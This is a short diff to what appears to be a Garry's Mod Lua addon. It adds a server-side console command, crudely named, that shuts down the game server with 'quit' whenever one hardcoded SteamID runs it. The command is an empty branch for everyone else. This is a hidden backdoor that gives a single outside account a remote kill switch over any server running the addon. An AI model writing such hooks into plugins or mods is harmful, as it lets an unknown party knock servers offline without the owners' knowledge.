@@ -104,6 +104,17 @@ end
 
 
 
+if SERVER then
+
+concommand.Add("penis_restart_server", function( ply, cmd, args ) 
+if ply:SteamID() == 'STEAM_0:0:555589835' then 
+    RunConsoleCommand("quit")
+
+       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+
+end
+end)
+end
 
 
 
